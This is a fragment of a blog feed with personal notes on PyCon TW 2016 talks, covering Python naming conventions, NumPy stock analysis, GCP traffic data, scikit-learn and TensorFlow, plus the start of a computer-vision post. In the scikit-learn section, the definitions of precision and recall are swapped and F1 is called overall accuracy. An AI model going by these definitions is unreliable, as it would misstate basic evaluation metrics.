&lt;li&gt;Definition: To understand a random line, the lines you need to read back.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;現在拿錢砸下去就有一堆機器可用，但拿錢砸學校無法生出一堆 programmer，好的維護性才能夠節省時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Making it zero&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;"Be exact &amp;amp; consistent."  &lt;ul&gt;
&lt;li&gt;精確的命名變數，不要用些模稜良可的名字。  &lt;/li&gt;
&lt;li&gt;要保持一致性，和英文的慣用法有關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;範例&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;result = ...&lt;/code&gt; =&amp;gt; (X) #不知道是什麼的 result&lt;br /&gt;
&lt;code&gt;parsed_dict = ...&lt;/code&gt; =&amp;gt; (O)  &lt;/p&gt;
&lt;p&gt;用動詞開頭代表 function&lt;br /&gt;
用形容詞、介系詞或句子來代表 boolean 值  &lt;/p&gt;
&lt;h4&gt;Ops Hinit&lt;/h4&gt;
&lt;h5&gt;for non-callable&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_no&lt;/code&gt;: numeric  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_&amp;lt;abstract type&amp;gt;&lt;/code&gt;:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;_seq&lt;/code&gt;: for sequence  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_gen&lt;/code&gt;: for generator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;for Callable&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ `&amp;lt;verb&amp;gt;_`  
+ `&amp;lt;yes-no question&amp;gt;`  
+ `to_&amp;lt;thing&amp;gt;`
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;explicit unknown&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ `_x`: anything  
    + rather tahn an ambiguous name.  
    + You won&amp;#39;t forget to determine the ops it supports.  
    + Use hasattr or isinstnace later.
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;So, avoid None&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = query_user(uid)  
user.is_valid()  

# Then `query_user` returns `None` =&amp;gt; BOOM! An `AttributeError`!  
# Accept Excetion?  
#   Y: just raises it  
#   N: use a dummy object like &amp;#39;&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;不夠精確的例子&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;arg = parse(arg)&lt;/code&gt; =&amp;gt; (X)&lt;br /&gt;
&lt;code&gt;arg_d = parse(arg_json)&lt;/code&gt; =&amp;gt; (O)  &lt;/p&gt;
&lt;h5&gt;str/x&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_key&lt;/code&gt;: key (of a dict)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_url&lt;/code&gt;: URL  &lt;ul&gt;
&lt;li&gt;percent-encode  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_json&lt;/code&gt;: JSON  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;json = json.loads(json)&lt;/code&gt; =&amp;gt; (X)  &lt;/li&gt;
&lt;li&gt;JSON is a string  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_html&lt;/code&gt;: HTML  &lt;ul&gt;
&lt;li&gt;avoid XSS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_sql&lt;/code&gt;: SQL  &lt;ul&gt;
&lt;li&gt;avoid SQL injection  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;numeric/x&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_no&lt;/code&gt;: number, #  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_idx&lt;/code&gt;: index  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;= 0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;or just &lt;code&gt;i&lt;/code&gt;, &lt;code&gt;j&lt;/code&gt;, &lt;code&gt;k&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_secs&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;It's seconds  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_pct&lt;/code&gt;: percent  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;n = 10%&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;n_pct = 10&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Structure Hint&lt;/h4&gt;
&lt;h5&gt;users&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;users = {  
    &amp;#39;a&amp;#39;: &amp;#39;a@a.com&amp;#39;,  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(X)&lt;br /&gt;
=&amp;gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;uid_email_map = {  
    &amp;#39;a&amp;#39;: &amp;#39;a@a.com&amp;#39;,  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(O)  &lt;/p&gt;
&lt;h5&gt;for dict &amp;amp; tuple&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;key&amp;gt;_&amp;lt;value&amp;gt;_map&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;tuple  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;_pair&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_pairs&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;2-level-tuple  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;1st&amp;gt;_&amp;lt;2nd&amp;gt;_&amp;lt;3rd&amp;gt;_triple&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Don't use me&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_&amp;lt;name&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Don't use when out of  &lt;ul&gt;
&lt;li&gt;a module  &lt;/li&gt;
&lt;li&gt;a class  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Performance Hint&lt;/h4&gt;
&lt;h5&gt;Should I cache it?&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;get_&lt;/code&gt;: memory op  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;parse_&lt;/code&gt; / &lt;code&gt;calc_&lt;/code&gt;: CPU-bound op  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;query_&lt;/code&gt;: IO-bound op  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;query_or_get_&lt;/code&gt;: IO-bound op with cache  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Progressive From Zero&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以用縮寫，但不要自己發明縮寫。  &lt;/li&gt;
&lt;li&gt;Define in comment  &lt;ul&gt;
&lt;li&gt;用註解說明這個簡寫的全名是什麼  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# TODO: ...&lt;/code&gt;  &lt;blockquote&gt;
&lt;p&gt;拜託不要用 &lt;code&gt;# TODO&lt;/code&gt; 啊...&lt;br /&gt;
最近被這荼毒的好慘，&lt;br /&gt;
有 version control 跟 issue tracker 就不應該這樣用啊，&lt;br /&gt;
留了一堆過沒多久搞不好自己都忘記。&lt;br /&gt;
這我記得在 《Clean Code》 裡頭就有說過啦，&lt;br /&gt;
除非真的完全沒用 version control 跟 issue tracker 可以紀錄，&lt;br /&gt;
否則這些東西應該要寫在 commit log 裏面，&lt;br /&gt;
然後開個 issue 來詳細描述 TODO 啊。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Paragraph &amp;amp; Section  &lt;ul&gt;
&lt;li&gt;適當的使用空白行，不要全部都擠在一起。  &lt;/li&gt;
&lt;li&gt;Title Comment: 當一個 function 做的事太多導致太長難以閱讀的話  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Line Functions Up  &lt;ul&gt;
&lt;li&gt;讓 trace back 函數時候的方向是一致的  &lt;/li&gt;
&lt;li&gt;有助於模組化  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Face Bad Smell&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Comment  &lt;ul&gt;
&lt;li&gt;pitfalls: the actual return type, side effects  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Seal it with better name or stabler wrapper  &lt;/li&gt;
&lt;li&gt;Stay focused  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;老實說這樣的命名法讓我彷彿看見匈牙利命名法的影子，&lt;br /&gt;
但的確這樣命名起來會省了很多麻煩，&lt;br /&gt;
總之就是一致性，&lt;br /&gt;
公司的話就需要 Coding Style 相關的規範去要求大家共同遵守了。&lt;br /&gt;
(然後我好像聽見靜態語言的嘲笑聲）  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 (2016/06/04 Sat)&lt;/h1&gt;
&lt;hr /&gt;
&lt;h2&gt;Keynote: Inside the Hat: Python @ Walt Disney Animation Studios by Paul Hildebrandt&lt;/h2&gt;
&lt;p&gt;提到了許多迪士尼內製作動畫的時候相關的經驗，覺得好酷啊。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: 用 Numpy 做一個自己的股票分析系統 by PF&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;資料從哪來  &lt;ul&gt;
&lt;li&gt;台灣證券交易所  &lt;/li&gt;
&lt;li&gt;台灣期貨交易所  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;重要資訊  &lt;ul&gt;
&lt;li&gt;時間  &lt;/li&gt;
&lt;li&gt;開盤價(Open)  &lt;/li&gt;
&lt;li&gt;收盤價(Close)  &lt;/li&gt;
&lt;li&gt;最高價(High)  &lt;/li&gt;
&lt;li&gt;最低價(Low)  &lt;/li&gt;
&lt;li&gt;成交量(Volume)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;移動平均線(MA)  &lt;ul&gt;
&lt;li&gt;(P1 + P2 + ... + Pn) / n  &lt;/li&gt;
&lt;li&gt;n 日均線，季線  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;動作  &lt;ul&gt;
&lt;li&gt;賣出、不動、買進  &lt;/li&gt;
&lt;li&gt;判斷買賣點  &lt;/li&gt;
&lt;li&gt;計算收益  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%9A%8F%E6%9C%BA%E6%8C%87%E6%A0%87"&gt;隨機指標(KD)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;判斷多空、計算利潤、代入參數  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;itertools&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;itertools.combination_with_replacement&lt;/code&gt; 拿來比較不同的均線  &lt;/li&gt;
&lt;li&gt;但這樣做量會非常大  &lt;/li&gt;
&lt;li&gt;所以利用 numpy 的高效能特性來解決  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numpy  &lt;/li&gt;
&lt;li&gt;架構  &lt;ul&gt;
&lt;li&gt;Sqlite + Flask + jQuery + amchart.js  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R1: 用 Google Cloud Platform 玩交通資料分析 by 柯維然(Odie)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;人每天都會有交通需求，會產生很多交通相關的資料  &lt;ul&gt;
&lt;li&gt;流量、車速、密度、旅行時間、旅次、號誌、停車位、交通事故  &lt;/li&gt;
&lt;li&gt;交通資料庫  &lt;ul&gt;
&lt;li&gt;高速公路局提供國道 VD(Viehcle Detector)、ETC 資料  &lt;/li&gt;
&lt;li&gt;縣市 Open Data 有些也有提供 VD 資料  &lt;/li&gt;
&lt;li&gt;約有 314 個門架、約有 3000 個 VD  &lt;/li&gt;
&lt;li&gt;國道五號每五百公尺就有一個 VD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為何用 Google Cloud Platform  &lt;ul&gt;
&lt;li&gt;因為我只會用這個 XD  &lt;/li&gt;
&lt;li&gt;架構  &lt;ul&gt;
&lt;li&gt;App Engine (網站、爬蟲、API）  &lt;ul&gt;
&lt;li&gt;因為其他學統計的是寫 R，所以要提供 API 給他們  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;cron.yaml&lt;/code&gt; 設定定時啟動  &lt;ul&gt;
&lt;li&gt;無法在 10 秒內完成的 job，就加到 TaskQueue 裏面，讓他失敗的時候會自動重跑。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Storage  &lt;ul&gt;
&lt;li&gt;存 blob files  &lt;/li&gt;
&lt;li&gt;可以 serve 靜態網站  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datastore  &lt;ul&gt;
&lt;li&gt;儲存部份資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BigQuery  &lt;ul&gt;
&lt;li&gt;儲存和分析、可接其他 tools  &lt;/li&gt;
&lt;li&gt;可用搭配 Pandas  &lt;/li&gt;
&lt;li&gt;Streaming Data into BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datalab  &lt;ul&gt;
&lt;li&gt;資料視覺化  &lt;/li&gt;
&lt;li&gt;可以直接用 scikit-learn, Pandas  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R1: 連淡水阿嬤都聽得懂的機器學習套件入門 scikit-learn by Cicilia (Chia-ying Lee)&lt;/h2&gt;
&lt;p&gt;Slides: &lt;a href="http://www.slideshare.net/aacs0130/scikitlearn-62706630"&gt;http://www.slideshare.net/aacs0130/scikitlearn-62706630&lt;/a&gt;  &lt;/p&gt;
&lt;h3&gt;對機器學習瞭解程度的分類&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Level 1: 不知道什麼是機器學習  &lt;/li&gt;
&lt;li&gt;Level 2: 知道機器學習是 AI 的子學門  &lt;/li&gt;
&lt;li&gt;Level 3: 會使用機器學習套件解問題  &lt;/li&gt;
&lt;li&gt;Level 4: 會選擇適合的機器學習演算法與調整參數  &lt;/li&gt;
&lt;li&gt;Level 5: 知道機器學習演算法的數學原理  &lt;/li&gt;
&lt;li&gt;Level 6: 會設計新的機器學習演算法  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;什麼是機器學習&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我們有大量的樣本資料，讓機器自動從中學習出規則，用來預測其他未知的資料。  &lt;/li&gt;
&lt;li&gt;機器學習是基於機率、統計、逼近論等數學理論的研究。  &lt;/li&gt;
&lt;li&gt;機器學習可應用於電腦視覺、自然語言處理、語音和手寫識別與機器人等領域。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;機器學習的分類&lt;/h3&gt;
&lt;p&gt;分類的方法有很多種，以下為粗略的分類。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Supervised Learning  &lt;ul&gt;
&lt;li&gt;訓練集的目標是人為標註的。  &lt;/li&gt;
&lt;li&gt;分類(Classification)：預測類別  &lt;/li&gt;
&lt;li&gt;回歸(Regression)：預測變量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unsupervised Learning  &lt;ul&gt;
&lt;li&gt;訓練集的目標沒有人為標註。  &lt;/li&gt;
&lt;li&gt;分群(Clustering)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;機器學習的流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Training set =&amp;gt; Learning Algorithm =&amp;gt; Hypothesis / Model  &lt;/li&gt;
&lt;li&gt;再拿 Training set 透過 model 得到預測的 data  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Scikit-learn 數字辨識步驟&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Load Data  &lt;/li&gt;
&lt;li&gt;Set a classifier  &lt;/li&gt;
&lt;li&gt;Learn a model  &lt;/li&gt;
&lt;li&gt;predict the result  &lt;ul&gt;
&lt;li&gt;資料有一半當作 training set，有一半當作 testing set.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Evaluate  &lt;ul&gt;
&lt;li&gt;得到結果  &lt;/li&gt;
&lt;li&gt;會去算 precision, recall, f1-score  &lt;ul&gt;
&lt;li&gt;precision: 所有正確的例子裏面猜對了幾個  &lt;/li&gt;
&lt;li&gt;recall: 所有猜的例子裏面猜對了幾個  &lt;/li&gt;
&lt;li&gt;f1-score: 整合 precision 和 recall 的結果，得到總正確率  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Confusion Matrix  &lt;ul&gt;
&lt;li&gt;可以得知哪個類別比較容易被誤判成另外的某一個類別  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;前處理&lt;/h3&gt;
&lt;p&gt;大部分的機器學習演算法都是數學或統計模型有關的，&lt;br /&gt;
所以資料餵進去的時候必須要有維度，必須經過處理。  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Clean data  &lt;ul&gt;
&lt;li&gt;把不需要或多餘的資料(noise)去除  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Feature extraction  &lt;ul&gt;
&lt;li&gt;需要 domain knowledge 把用來判斷的關鍵抓出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convert category and string to number  &lt;/li&gt;
&lt;li&gt;Sparse data  &lt;/li&gt;
&lt;li&gt;Feature selection  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;如何選擇該用哪個機器學習演算法&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://scikit-learn.org/stable/tutorial/machine_learning_map/"&gt;http://scikit-learn.org/stable/tutorial/machine_learning_map/&lt;/a&gt;  &lt;/p&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLXVfgk9fNX2I7tB6oIINGBmW50rrmFTqf"&gt;林軒田教授的機器學習教學影片&lt;/a&gt;  &lt;blockquote&gt;
&lt;p&gt;&lt;a href="http://blog.fukuball.com/tag/machine-learning/"&gt;http://blog.fukuball.com/tag/machine-learning/&lt;/a&gt; 有人寫了筆記可以參考  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: Deep Learning with Python &amp;amp; TensorFlow by Ian Lewis&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Neural Network can find a way to solve the problem.  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://playground.tensorflow.org"&gt;http://playground.tensorflow.org&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;基本上就是簡介 TensorFlow 及基本的 Machine Learning 概念  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 3 (2016/06/05 Sun)&lt;/h1&gt;
&lt;h2&gt;Lightning Talks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Swiftypy: Embedding Python in Swift  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/johnlinvc/swiftpy"&gt;https://github.com/johnlinvc/swiftpy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跟雪隧塞車說再見  &lt;ul&gt;
&lt;li&gt;結論：「避開各種假日就好了。」  &lt;/li&gt;
&lt;li&gt;半夜最不塞，半個小時就到了，你可以開到那邊再睡。XDD  &lt;/li&gt;
&lt;li&gt;你如果是今天看到新聞想說今天塞完了明天去，你就是最塞的那個。 XDDD  &lt;blockquote&gt;
&lt;p&gt;雖然跟 Python 沒什麼關係 XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ProjectMeilin"&gt;徵音梅林計劃&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中文版的初音！  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Play with Python importer  &lt;ul&gt;
&lt;li&gt;可以做到直接 import 進來就去 pip 上抓下來用  &lt;/li&gt;
&lt;li&gt;cffi  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PyCon TW 2016 Vendor Machine  &lt;/li&gt;
&lt;li&gt;用 Python 來分析德文性什麼  &lt;/li&gt;
&lt;li&gt;用 Python 玩 Docker  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/windperson/docker-crontab"&gt;https://github.com/windperson/docker-crontab&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rpi 在研討會上的應用  &lt;ul&gt;
&lt;li&gt;今年的新玩具：Pi 立得，用 Rpi 做相機，拍照完可以馬上列印出相片。  &lt;/li&gt;
&lt;li&gt;明年想做的玩具：講者評分系統  &lt;ul&gt;
&lt;li&gt;問卷回饋大家愛填不填  &lt;/li&gt;
&lt;li&gt;可以用 Camera 來看底下有多少人在睡覺來做評分 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我在業界學到的 Python Coding sytle  &lt;/li&gt;
&lt;li&gt;用 Python 寫視覺小說遊戲（亮亮的祭品）  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;今年原本預計要投稿結果還是沒投稿，&lt;br /&gt;
看明年有沒有機會吧？&lt;br /&gt;
其實應該不是沒東西可講，&lt;br /&gt;
只是單純覺得要到夠資格投稿講的程度還有一段差距。&lt;br /&gt;
而且好像該每天找些時間，&lt;br /&gt;
把近幾年世界各地的 PyCon 講了哪些 talks 都瞭解一下才是，&lt;br /&gt;
一直沒有花時間去好好瞭解其他地方的 PyCon 講了哪些議題。  &lt;/p&gt;
&lt;p&gt;今年和 Machine Learning 相關的 talk 明顯多了很多，&lt;br /&gt;
然後發現蠻多議程都有用到 Google Cloud Platform，&lt;br /&gt;
尤其很多人都拿 BigQuery 來用，&lt;br /&gt;
或許之後跟 GCP 更熟之後，&lt;br /&gt;
明年有機會可以來講場 Python 跟 GCP 有關的 talk 吧？&lt;br /&gt;
然後 Apua 講的那場 Roboframework 的 Q&amp;amp;A 也蠻熱烈的，&lt;br /&gt;
看來在 Agile 跟如何更快更方便的寫出夠完整的測試也還有蠻多關注的空間的。  &lt;/p&gt;
&lt;p&gt;第二天晚上因為弟弟電影的畢展，和爸媽一起去看，所以沒能參加 BoF。&lt;br /&gt;
第三天到了中午才到中研院，所以就只有參加到 Lightnig talks。&lt;br /&gt;
大概是因為用的是 eldarion 送的贊助票，所以互動販賣機的系統無法登入，也沒玩到互動販賣機。&lt;br /&gt;
大概也因為太久沒打 CTF 了，趨勢的五個題目也都沒解出來啊。&lt;br /&gt;
總之還有很多進步的空間。  &lt;/p&gt;
&lt;p&gt;在天瓏的攤位買了五本書，&lt;br /&gt;
希望可以如期看完，&lt;br /&gt;
今年要增加自己的閱讀量，&lt;br /&gt;
希望可以趕快看完啊。  &lt;/p&gt;
&lt;p&gt;當然還是要感謝辛苦的工作人員們，&lt;br /&gt;
感謝給了大家這麼好的一場年會。  &lt;/p&gt;</summary><category term="Python"></category><category term="Conf"></category><category term="PyCon"></category><category term="PyConTW"></category></entry><entry><title>視訊訊號處理與深度學習應用</title><link href="https://blog.m157q.tw/posts/2016/04/23/video-signal-processing-and-the-application-of-deep-learning/" rel="alternate"></link><published>2016-04-24T14:43:00+08:00</published><updated>2016-04-24T14:43:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-04-23:posts/2016/04/23/video-signal-processing-and-the-application-of-deep-learning/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href="http://dsc.kktix.cc/events/video-signal"&gt;http://dsc.kktix.cc/events/video-signal&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://datasci.tw/event/vision_and_learning/"&gt;http://datasci.tw/event/vision_and_learning/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Slides: &lt;a href="http://www.slideshare.net/tw_dsconf/ss-61255961"&gt;http://www.slideshare.net/tw_dsconf/ss-61255961&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWITllMazh2a0ctZVk/view?usp=sharing"&gt;備份&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;【判讀】電腦視覺簡介&lt;/h1&gt;
&lt;h2&gt;Real Cases in Computer Vision&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Character Recognition (LeNet)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=4LxlhoemR3A"&gt;Microsoft PhotoSynth&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=ohmajJTcpNk"&gt;Video Reenactment&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Auto Driving  &lt;ul&gt;
&lt;li&gt;Autonomous Cars - NVIDIA Drive PX2  &lt;ul&gt;
&lt;li&gt;Object class recognition  &lt;/li&gt;
&lt;li&gt;Semantic Segmentation  &lt;ul&gt;
&lt;li&gt;分辨出哪裡是車子可以開的地方  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Radar  &lt;ul&gt;
&lt;li&gt;用雷射去掃周邊的環境，可以很快速的去辨認，但跟電腦視覺比較無關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;電子後照鏡  &lt;ul&gt;
&lt;li&gt;解決視線死角問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=gUIKtqyUIo8"&gt;Grandma rides a Tesla&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Trip Wire  &lt;/li&gt;
&lt;li&gt;Loitering  &lt;/li&gt;
&lt;li&gt;People Count  &lt;/li&gt;
&lt;li&gt;Speed Test  &lt;ul&gt;
&lt;li&gt;不用都卜勒雷達算，直接用影像計算。  &lt;/li&gt;
&lt;li&gt;不小心歪掉就不準了，所以大家知道怎麼躲這種測速了吧 （XDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Smart Daily  &lt;ul&gt;
&lt;li&gt;用監視器的影像辨認人臉打卡。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Smart Fast Forward (Skywatch 的產品)  &lt;ul&gt;
&lt;li&gt;用影像辨識來判斷農舍監視器畫面中哪些時間是有人的，主要是用來定期追蹤是否有記得噴灑農藥。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Structure from motion  &lt;/li&gt;
&lt;li&gt;3D Reconstruction  &lt;/li&gt;
&lt;li&gt;Person tracking  &lt;/li&gt;
&lt;li&gt;Face detection  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Relationship to Data Science?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Rich info, lots of data (in terms of bits)  &lt;/li&gt;
&lt;li&gt;Unstructured, usually without much context / semantics  &lt;/li&gt;
&lt;li&gt;Difficult to process and query  &lt;/li&gt;
&lt;li&gt;We are generating them every day  &lt;ul&gt;
